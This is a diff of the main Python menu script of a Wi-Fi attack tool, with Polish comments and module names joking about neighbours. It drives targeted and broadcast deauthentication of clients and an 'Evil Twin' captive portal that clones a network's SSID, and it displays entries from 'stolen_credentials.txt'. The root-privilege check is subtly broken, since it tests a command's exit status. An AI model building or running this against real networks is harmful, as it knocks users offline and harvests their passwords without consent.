@@ -2,563 +2,329 @@
 
 import sys
 import time
-import threading
 import subprocess
+import signal
+import select  # Kluczowe do nieblokującego inputu
+import math
+import os
+from typing import Optional
 
-from find_lucky_neighbours import WiFiScanner
-from get_clients_disconnected import DeauthAttackManager
-from data import WiFiNet, ClientDevice
-from captive_portal import CaptivePortalAttack
+# Import modułów (upewnij się, że pliki są w tym samym folderze)
+try:
+    from find_lucky_neighbours import WiFiScanner
+    from argue_with_neighbours import DeauthAttackManager
+    from captive_portal import CaptivePortalAttack
+except ImportError as e:
+    print(f"[!] Critical Error: Missing modules. {e}")
+    sys.exit(1)
 
+# --- GLOBAL STATE ---
+scanner: Optional[WiFiScanner] = None
+attacker: Optional[DeauthAttackManager] = None
+portal: Optional[CaptivePortalAttack] = None
+current_interface: str = ""
+selected_ap = None
 
-scanner = None
-deauth_manager = None
-portal_attack = None
+# --- UTILS ---
 
-current_interface = None
-scanning = False
-deep_scanning = False
-scan_thread = None
-deep_scan_thread = None
-
-
-def clear():
-    """Czyści ekran w terminalu."""
+def clear_screen():
     print("\033[H\033[J", end="")
 
+def print_banner():
+    print(r"""[ WIFI AUDIT TOOL v2.0 - LIVE DASHBOARD ]""")
+    print("-" * 65)
 
-def log(msg):
-    """Prosty logger do konsoli."""
-    print(msg)
+def handle_exit_global(signum, frame):
+    """Brutalne wyjście po Ctrl+C - sprząta po sobie."""
+    print("\n\n[!] CRITICAL STOP. Restoring interfaces...")
+    if attacker: attacker.stop_all_attacks()
+    if portal: portal.stop_portal()
+    if scanner:
+        scanner.stop_scan()
+        if current_interface:
+            scanner.restore_managed_mode(current_interface)
+    print("[+] Done. Exiting.")
+    sys.exit(0)
 
-def disable_network_services():
+# Rejestracja sygnału Ctrl+C
+signal.signal(signal.SIGINT, handle_exit_global)
+
+def input_with_timeout(timeout=2.0):
     """
-    Wyłącza NetworkManagera i radio Wi-Fi na czas eksperymentu.
-    Dzięki temu sterownik nie blokuje trybu monitor i zmiany kanałów.
+    Czeka na input przez określony czas (timeout).
+    Jeśli użytkownik nic nie wpisze, zwraca None (co pozwala odświeżyć ekran).
+    Jeśli wpisze - zwraca tekst.
     """
-    try:
-        log("Stopping NetworkManager and disabling Wi-Fi...")
-        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
-        subprocess.run(["nmcli", "radio", "wifi", "off"], check=False)
-    except Exception as e:
-        log(f"Could not stop NetworkManager / Wi-Fi: {e}")
+    i, o, e = select.select([sys.stdin], [], [], timeout)
+    if i:
+        return sys.stdin.readline().strip()
+    return None
 
-def enable_network_services():
-    """
-    Włącza NetworkManagera i radio Wi-Fi.
-    Używane w cleanup(), żeby po pracy z donglem wszystko wróciło do normalnego stanu.
-    """
-    try:
-        log("Starting NetworkManager and enabling Wi-Fi...")
-        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
-        subprocess.run(["nmcli", "radio", "wifi", "on"], check=False)
-    except Exception as e:
-        log(f"Could not start NetworkManager / Wi-Fi: {e}")
+# --- PHASE 1: INITIALIZATION ---
 
-
-def select_interface():
-    global scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return None
-
-    ifaces = scanner.get_interfaces()
-    if not ifaces:
-        log("No WiFi interfaces found.")
-        return None
-
-    clear()
-    log("=" * 60)
-    log("WiFi Lab Tool")
-    log("=" * 60)
-    log("\nAvailable interfaces:\n")
-
-    for i, iface in enumerate(ifaces, 1):
-        log(f"{i}. {iface}")
-
+def init_interface():
+    global scanner, current_interface
+    scanner = WiFiScanner(debug=False)
+    
     while True:
-        choice = input("\nSelect interface (1-{}): ".format(len(ifaces))).strip()
+        clear_screen()
+        print_banner()
+        print("[ PHASE 1: Initialization ]\n")
+        interfaces = scanner.get_interfaces()
+        if not interfaces:
+            print("[-] No wireless interfaces found.")
+            sys.exit(1)
+            
+        print("Available Interfaces:")
+        for i, iface in enumerate(interfaces):
+            print(f"  [{i}] {iface}")
+            
+        choice = input("\nSelect interface index > ")
         if choice.isdigit():
             idx = int(choice)
-            if 1 <= idx <= len(ifaces):
-                iface = ifaces[idx - 1]
+            if 0 <= idx < len(interfaces):
+                current_interface = interfaces[idx]
+                break
+                
+    print(f"\n[*] Enabling Monitor Mode on {current_interface}...")
+    if not scanner.set_monitor_mode(current_interface):
+        print("[-] Failed to set monitor mode (Root required?)")
+        sys.exit(1)
+    print("[+] Monitor mode active.")
+    time.sleep(1)
 
-                disable_network_services()
+# --- PHASE 2: DISCOVERY DASHBOARD ---
 
-                log(f"\nSetting monitor mode on {iface}...")
-                if scanner.set_monitor_mode(iface):
-                    log("Monitor mode OK.\n")
-                    return iface
-                else:
-                    log("Failed to set monitor mode.\n")
-          
-                    enable_network_services()
-                    return None
-        log("Invalid choice.")
+def discovery_menu():
+    global selected_ap
+    
+    # Automatyczny start skanowania przy wejściu w tę fazę
+    if not scanner.scanning:
+        scanner.start_ap_discovery(current_interface)
 
+    while True:
+        clear_screen()
+        print_banner()
+        
+        # STATUS NA ŻYWO
+        aps_count = len(scanner.networks)
+        clients_activity = sum(len(c) for c in scanner.clients.values())
+        scan_state = "SCANNING" if scanner.scanning else "PAUSED"
+        
+        print(f"Interface: {current_interface} | Mode: {scan_state}")
+        print(f"Total APs: {aps_count}     | Total Clients Detected: {clients_activity}")
+        print("=" * 65)
+        print("[S] Stop/Start Scan")
+        print("[L] Show AP List & Select Target")
+        print("[Q] Quit Tool")
+        print("=" * 65)
+        print("(Screen refreshes automatically. Just type command...)")
+        
+        # Czekamy na klawisz lub timeout (odświeżenie)
+        cmd = input_with_timeout(2.0)
+        
+        if cmd is None:
+            continue # Pętla wraca na początek -> odświeża ekran
+            
+        cmd = cmd.lower()
+        
+        if cmd == 's':
+            if scanner.scanning:
+                scanner.stop_scan()
+            else:
+                scanner.start_ap_discovery(current_interface)
+        
+        elif cmd == 'l':
+            scanner.stop_scan() # Zatrzymujemy skanowanie, żeby wybrać cel
+            target = show_ap_list_interactive()
+            if target:
+                selected_ap = target
+                target_dashboard_logic() # Przechodzimy do Fazy 3
+                # Po powrocie wznawiamy skanowanie ogólne
+                scanner.start_ap_discovery(current_interface)
+                
+        elif cmd == 'q':
+            handle_exit_global(None, None)
 
-def start_ap_discovery(iface):
-    global scan_thread, scanning, scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return
-
-    def scan_worker():
-        scanner.start_ap_discovery(iface)
-
-    scan_thread = threading.Thread(target=scan_worker, daemon=True)
-    scan_thread.start()
-    scanning = True
-    log(f"AP Discovery started on {iface}...\n")
-
-
-def stop_ap_discovery():
-    global scanning, scanner
-
-    if scanner is None:
-        return
-
-    if scanning:
-        scanner.stop_scan()
-        scanning = False
-        log("AP Discovery stopped.\n")
-
-
-def start_deep_scan(iface, bssid, channel):
-    global deep_scan_thread, deep_scanning, scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return
-
-    def deep_worker():
-        scanner.lock_on_ap(iface, bssid, channel)
-
-    deep_scan_thread = threading.Thread(target=deep_worker, daemon=True)
-    deep_scan_thread.start()
-    deep_scanning = True
-    log(f"Deep scan started on {bssid} (CH {channel})...\n")
-
-
-def stop_deep_scan():
-    global deep_scanning, scanner
-
-    if scanner is None:
-        return
-
-    if deep_scanning:
-        scanner.deep_scanning = False
-        deep_scanning = False
-        log("Deep scan stopped.\n")
-
-
-def show_ap_list():
-    global scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return
-
-    networks = scanner.get_network_list()
+def show_ap_list_interactive():
+    # Lista statyczna do wyboru celu (paginacja)
+    networks = list(scanner.networks.values())
+    networks.sort(key=lambda x: x.signal_dbm, reverse=True)
+    
     if not networks:
-        log("No networks found yet. Keep scanning...")
-        time.sleep(1)
-        return
-
-    clear()
-    log("=" * 100)
-    log("DISCOVERED ACCESS POINTS")
-    log("=" * 100)
-    log(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'RSSI':<6} {'Vendor':<15} {'PMF':<8}")
-    log("-" * 100)
-
-    for idx, net in enumerate(networks[:20], 1):
-        ssid = (net.ssid if net.ssid else "<Hidden>")[:25]
-        vendor = net.vendor[:15] if net.vendor else "Unknown"
-        pmf = "Yes" if net.rsn_pmf == "required" else "No"
-        log(
-            f"{idx:<3} {ssid:<25} {net.bssid:<18} "
-            f"{net.channel:<3} {net.signal_dbm:<6} {vendor:<15} {pmf:<8}"
-        )
-
-    log("=" * 100)
-    log(f"Total networks: {len(networks)}\n")
-
-
-def select_ap():
-    global scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return None
-
-    networks = scanner.get_network_list()
-    if not networks:
-        log("No networks available.")
+        print("\n[-] No APs found yet.")
         time.sleep(1)
         return None
 
     page = 0
-    per_page = 15
-
+    per_page = 20
+    
     while True:
-        clear()
-        total_pages = (len(networks) + per_page - 1) // per_page
+        total_pages = math.ceil(len(networks) / per_page)
         start_idx = page * per_page
         end_idx = start_idx + per_page
         page_networks = networks[start_idx:end_idx]
-
-        log("=" * 100)
-        log("DISCOVERED ACCESS POINTS")
-        log("=" * 100)
-        log(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'RSSI':<6} {'Vendor':<15} {'PMF':<8}")
-        log("-" * 100)
-
+        
+        clear_screen()
+        print(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'CH':<3} {'PWR':<5} {'ENC':<8}")
+        print("-" * 70)
+        
         for idx, net in enumerate(page_networks, 1):
             ssid = (net.ssid if net.ssid else "<Hidden>")[:25]
-            vendor = net.vendor[:15] if net.vendor else "Unknown"
-            pmf = "Yes" if net.rsn_pmf == "required" else "No"
-            log(
-                f"{idx:<3} {ssid:<25} {net.bssid:<18} "
-                f"{net.channel:<3} {net.signal_dbm:<6} {vendor:<15} {pmf:<8}"
-            )
-
-        log("=" * 100)
-        log(f"Page {page + 1}/{total_pages}")
-        log("Commands: [1-{}] Select | [n] Next | [p] Prev | [b] Back\n".format(len(page_networks)))
-
-        choice = input("Select: ").strip().lower()
-
-        if choice == "b":
+            enc = getattr(net, 'crypto', 'OPEN')
+            print(f"{idx:<3} {ssid:<25} {net.bssid:<18} {net.channel:<3} {net.signal_dbm:<5} {enc:<8}")
+            
+        print("-" * 70)
+        print(f"Page {page + 1}/{total_pages} | Total: {len(networks)}")
+        print(f"[n] Next | [p] Prev | [b] Back | OR Type Number to Select")
+        
+        sel = input("\nSelect > ").strip().lower()
+        
+        if sel == 'b':
             return None
-        elif choice == "n":
-            if page < total_pages - 1:
-                page += 1
-            continue
-        elif choice == "p":
-            if page > 0:
-                page -= 1
-            continue
-        elif choice.isdigit():
-            idx = int(choice)
+        elif sel == 'n':
+            if page < total_pages - 1: page += 1
+        elif sel == 'p':
+            if page > 0: page -= 1
+        elif sel.isdigit():
+            idx = int(sel)
             if 1 <= idx <= len(page_networks):
                 return page_networks[idx - 1]
-            else:
-                log("Invalid choice.")
-                time.sleep(1)
-                continue
 
+# --- PHASE 3: TARGET DASHBOARD (ALL IN ONE) ---
 
-def show_ap_info(network):
-    global scanner
-
-    if scanner is None:
-        log("Scanner not initialized.")
-        return
-
-    clients = scanner.get_clients_for_ap(network.bssid)
-
-    clear()
-    log("=" * 70)
-    log(f"AP INFO: {network.ssid if network.ssid else '<Hidden>'}")
-    log("=" * 70)
-    log(f"BSSID:       {network.bssid}")
-    log(f"Channel:     {network.channel}")
-    log(f"RSSI:        {network.signal_dbm} dBm")
-    log(f"Clients:     {len(clients)}")
-    log(f"Vendor:      {network.vendor}")
-    log(f"PMF:         {network.rsn_pmf}\n")
-
-    if clients:
-        log("CONNECTED CLIENTS:")
-        log("-" * 70)
-        for idx, client in enumerate(clients, 1):
-            log(f"{idx}. {client.mac} (RSSI: {client.signal_dbm} dBm)")
-    else:
-        log("No clients detected yet.")
-        log("Tip: keep deep scan running for longer to catch more traffic.\n")
-
-
-def ap_operations_menu(network):
-    global scanner, deauth_manager, current_interface, deep_scanning
-
-    if scanner is None or deauth_manager is None:
-        log("Modules not initialized.")
-        time.sleep(1)
-        return
+def target_dashboard_logic():
+    global attacker, portal
+    if attacker is None: attacker = DeauthAttackManager()
+    if portal is None: portal = CaptivePortalAttack()
+    
+    msg = "" # Miejsce na komunikaty (np. "Attack Started")
 
     while True:
-        show_ap_info(network)
-
-        log("1. Start deep client scan (lock on channel)")
-        log("2. Deauth all clients")
-        log("3. Deauth specific client")
-        log("4. Captive Portal Attack")
-        log("5. Export results")
-        log("6. Back\n")
-
-        choice = input("Select: ").strip()
-
-        if choice == "1":
-            if not deep_scanning:
-                if current_interface is None:
-                    log("No interface selected.")
-                else:
-                    start_deep_scan(current_interface, network.bssid, network.channel)
-                    log("Deep scan running in background. Refresh to see new clients.\n")
-                input("Press Enter...")
-            else:
-                log("Deep scan already running.")
-                input("Press Enter...")
-
-        elif choice == "2":
-            clients = scanner.get_clients_for_ap(network.bssid)
-            if not clients:
-                log("No clients to deauth.")
-            else:
-                log(f"Starting deauth on {len(clients)} clients...")
-                for client in clients:
-                    deauth_manager.start_client_attack(
-                        client.mac,
-                        network.bssid,
-                        current_interface,
-                    )
-                log("Deauth attacks started.")
-            input("Press Enter...")
-
-        elif choice == "3":
-            clients = scanner.get_clients_for_ap(network.bssid)
-            if not clients:
-                log("No clients found.")
-            else:
-                log("Select client:")
-                for idx, client in enumerate(clients, 1):
-                    log(f"{idx}. {client.mac} (RSSI: {client.signal_dbm} dBm)")
-
-                sel = input("\nSelect (or 'c' to cancel): ").strip()
-                if sel.lower() != "c" and sel.isdigit():
-                    idx = int(sel)
-                    if 1 <= idx <= len(clients):
-                        client = clients[idx - 1]
-                        deauth_manager.start_client_attack(
-                            client.mac,
-                            network.bssid,
-                            current_interface,
-                        )
-                        log("Deauth attack started.")
-            input("Press Enter...")
-
-        elif choice == "4":
-            captive_portal_menu(network)
-
-        elif choice == "5":
-            filename = scanner.export_results()
-            log(f"Exported to: {filename}\n")
-            input("Press Enter...")
-
-        elif choice == "6":
-            break
-
-        else:
-            log("Invalid choice.")
-
-
-def captive_portal_menu(network):
-    global portal_attack, scanner, deauth_manager, current_interface
-
-    if portal_attack is None or scanner is None or deauth_manager is None:
-        log("Modules not initialized.")
-        time.sleep(1)
-        return
-
-    while True:
-        stats = portal_attack.get_stats()
-
-        clear()
-        log("=" * 60)
-        log("CAPTIVE PORTAL ATTACK")
-        log("=" * 60)
-        log(f"Target: {network.ssid if network.ssid else '<Hidden>'}")
-        log(f"Status: {'RUNNING' if stats['is_running'] else 'STOPPED'}")
-        log(f"Credentials: {stats['total_credentials']}\n")
-
-        log("1. Start attack (deauth + portal)")
-        log("2. Show credentials")
-        log("3. Stop attack")
-        log("4. Back\n")
-
-        choice = input("Select: ").strip()
-
-        if choice == "1":
-            target_ssid = network.ssid if network.ssid else "FreeWiFi"
-            log(f"Starting deauth + portal for: {target_ssid}")
-
-            clients = scanner.get_clients_for_ap(network.bssid)
-            for client in clients:
-                deauth_manager.start_client_attack(
-                    client.mac,
-                    network.bssid,
-                    current_interface,
-                )
-
-            if portal_attack.start_portal(current_interface, target_ssid):
-                log("Captive portal started!")
-            else:
-                log("Failed.")
-            input("Press Enter...")
-
-        elif choice == "2":
+        clear_screen()
+        # --- HEADER ---
+        print("=" * 65)
+        print(f" TARGET: {selected_ap.ssid} ({selected_ap.bssid})")
+        print(f" CH: {selected_ap.channel} | PWR: {selected_ap.signal_dbm} | ENC: {getattr(selected_ap, 'crypto', '?')}")
+        print("=" * 65)
+        
+        # --- CAPTIVE PORTAL MONITOR (LIVE) ---
+        # To jest sekcja, która czyta plik na bieżąco
+        print("\n [ CAPTIVE PORTAL MONITOR ]")
+        portal_status = "RUNNING" if portal.is_running else "STOPPED"
+        print(f" Status: {portal_status}")
+        
+        log_file = "stolen_credentials.txt" # Musi się zgadzać z nazwą w captive_portal.py
+        if os.path.exists(log_file):
             try:
-                with open(portal_attack.credentials_file, "r") as f:
-                    content = f.read()
-                    if content:
-                        log("\nCAPTURED CREDENTIALS:")
-                        log("-" * 40)
-                        log(content)
+                with open(log_file, "r") as f:
+                    lines = f.readlines()
+                    if not lines:
+                        print("   (File empty - waiting for data...)")
                     else:
-                        log("No credentials yet.")
-            except FileNotFoundError:
-                log("No credentials file.")
-            input("Press Enter...")
-
-        elif choice == "3":
-            portal_attack.stop_portal()
-            deauth_manager.stop_all_attacks()
-            log("Stopped.")
-            input("Press Enter...")
-
-        elif choice == "4":
-            break
-
+                        print(f"   Total Captured Entries: {len(lines)}")
+                        print("   --- LATEST DATA ---")
+                        # Pokazujemy 3 ostatnie linie
+                        for line in lines[-3:]:
+                            print(f"   > {line.strip()}")
+            except Exception as e:
+                print(f"   (Error reading log file: {e})")
         else:
-            log("Invalid choice.")
+            print("   (No log file yet. Start Portal to generate one.)")
+        
+        print("-" * 65)
+        
+        # --- CLIENTS LIST (DEEP SCAN) ---
+        ds_status = "ACTIVE" if scanner.deep_scanning else "OFF"
+        clients = scanner.clients.get(selected_ap.bssid, [])
+        
+        print(f"\n [ CLIENTS LIST (Deep Scan: {ds_status}) ]")
+        if not clients:
+            print("   No clients detected yet. (Turn ON Deep Scan)")
+        else:
+            print(f"   {'ID':<3} {'MAC ADDRESS':<18} {'PWR':<6} {'LAST SEEN'}")
+            for i, c in enumerate(clients, 1):
+                # Formatowanie czasu (tylko godzina)
+                time_str = c.last_seen.split("T")[-1][:8] if "T" in c.last_seen else c.last_seen
+                print(f"   [{i}] {c.mac:<18} {c.signal_dbm:<6} {time_str}")
+        
+        print("\n" + "=" * 65)
+        print(" COMMANDS:")
+        print(" [S] Toggle Deep Scan (Find Clients)")
+        print(" [P] Start Evil Twin Portal")
+        print(" [B] Broadcast Deauth (Kick ALL)")
+        print(" [K] STOP ALL ATTACKS (Panic Button)")
+        print(" [0] Back to AP List")
+        print(" [1-9] Type Client ID to DEAUTH specific user")
+        
+        if msg:
+            print(f"\n >> {msg}")
+            msg = "" # Czyścimy po wyświetleniu
 
-
-def main_menu():
-    global scanning, current_interface, scanner, deauth_manager, deep_scanning
-
-    if scanner is None or deauth_manager is None:
-        log("Modules not initialized.")
-        return
-
-    while True:
-        clear()
-        log("=" * 60)
-        log("WiFi Tool(name in progress) ")
-        log("=" * 60)
-
-        networks = scanner.get_network_list()
-        log(f"Interface: {current_interface if current_interface else 'None'}")
-        log(f"Status:   {'DISCOVERING APs' if scanning else 'STOPPED'}")
-        log(f"Deep scan:{'ON' if deep_scanning else 'OFF'}")
-        log(f"Networks: {len(networks)}\n")
-
-        log("1. Show AP list & select")
-        log("2. Start/Stop AP discovery")
-        log("3. Stop all attacks")
-        log("4. Export results")
-        log("5. Change interface")
-        log("6. Exit\n")
-
-        choice = input("Select: ").strip()
-
-        if choice == "1":
-            net = select_ap()
-            if net:
-                ap_operations_menu(net)
-
-        elif choice == "2":
-            if current_interface is None:
-                log("No interface selected.")
-                input("Press Enter...")
-                continue
-
-            if scanning:
-                stop_ap_discovery()
+        # Czekamy 3 sekundy na komendę, potem odświeżamy
+        cmd = input_with_timeout(3.0)
+        
+        if cmd is None:
+            continue # Odśwież ekran
+            
+        cmd = cmd.strip().lower()
+        
+        # --- LOGIKA KOMEND ---
+        
+        if cmd == '0':
+            scanner.stop_scan()
+            attacker.stop_all_attacks()
+            # Nie zatrzymujemy portalu automatycznie przy wyjściu z menu, 
+            # chyba że tego chcesz. Tutaj portal może działać w tle.
+            break
+            
+        elif cmd == 's':
+            if scanner.deep_scanning:
+                scanner.stop_scan()
+                msg = "Deep Scan STOPPED."
             else:
-                start_ap_discovery(current_interface)
-            time.sleep(1)
+                scanner.lock_on_ap(current_interface, selected_ap.bssid, selected_ap.channel)
+                msg = "Deep Scan STARTED. Watching for clients..."
+                
+        elif cmd == 'p':
+            if portal.start_portal(current_interface, selected_ap.ssid):
+                msg = "Captive Portal STARTED. Monitor is active above."
+            else:
+                msg = "Portal already running."
 
-        elif choice == "3":
-            deauth_manager.stop_all_attacks()
-            log("All attacks stopped.\n")
-            input("Press Enter...")
+        elif cmd == 'b':
+            # Atak Broadcast (wszyscy)
+            attacker.start_client_attack("ff:ff:ff:ff:ff:ff", selected_ap.bssid, current_interface)
+            for c in clients:
+                attacker.start_client_attack(c.mac, selected_ap.bssid, current_interface)
+            msg = "BROADCAST DEAUTH SENT to everyone!"
+            
+        elif cmd == 'k':
+            attacker.stop_all_attacks()
+            portal.stop_portal()
+            if scanner.deep_scanning: scanner.stop_scan()
+            msg = "ALL SYSTEMS STOPPED."
 
-        elif choice == "4":
-            filename = scanner.export_results()
-            log(f"Exported to: {filename}\n")
-            input("Press Enter...")
+        elif cmd.isdigit():
+            # Atak na konkretnego klienta po numerze ID z listy
+            idx = int(cmd)
+            if 1 <= idx <= len(clients):
+                target_mac = clients[idx-1].mac
+                attacker.start_client_attack(target_mac, selected_ap.bssid, current_interface)
+                msg = f"DEAUTH ATTACK STARTED on {target_mac}"
+            else:
+                msg = "Invalid Client ID."
 
-        elif choice == "5":
-            stop_ap_discovery()
-            stop_deep_scan()
-            deauth_manager.stop_all_attacks()
-            if current_interface:
-                scanner.restore_managed_mode(current_interface)
-            iface = select_interface()
-            if iface:
-                current_interface = iface
-                start_ap_discovery(iface)
-
-        elif choice == "6":
-            break
-
-        else:
-            log("Invalid choice.")
-
-
-def cleanup():
-    global current_interface, scanner, deauth_manager, portal_attack
-
-    log("\nCleaning up...")
-    stop_ap_discovery()
-    stop_deep_scan()
-
-    if deauth_manager is not None:
-        deauth_manager.stop_all_attacks()
-
-    if portal_attack and portal_attack.is_running:
-        portal_attack.stop_portal()
-
-    if scanner is not None and current_interface:
-        log(f"Restoring {current_interface}...")
-        scanner.restore_managed_mode(current_interface)
-
-    enable_network_services()
-    log("Done.\n")
-
-
-def main():
-    global scanner, deauth_manager, portal_attack, current_interface, scanning
-
-    try:
-        scanner = WiFiScanner(debug=True)
-        deauth_manager = DeauthAttackManager(debug=True)
-        portal_attack = CaptivePortalAttack()
-
-        iface = select_interface()
-        if not iface:
-            log("No interface selected.")
-            return
-
-        current_interface = iface
-        start_ap_discovery(iface)
-        time.sleep(1)
-
-        main_menu()
-
-    except KeyboardInterrupt:
-        log("\n\nInterrupted.")
-    except Exception as e:
-        log(f"\nError: {e}")
-        import traceback
-        traceback.print_exc()
-    finally:
-        cleanup()
-
+# --- ENTRY POINT ---
 
 if __name__ == "__main__":
-    main()
-
+    # Sprawdzenie uprawnień roota
+    if subprocess.call("id -u", shell=True, stdout=subprocess.DEVNULL) != 0:
+        print("[-] Root privileges required. Please run with sudo.")
+        sys.exit(1)
+        
+    try:
+        init_interface()
+        discovery_menu()
+    except KeyboardInterrupt:
+        handle_exit_global(None, None)
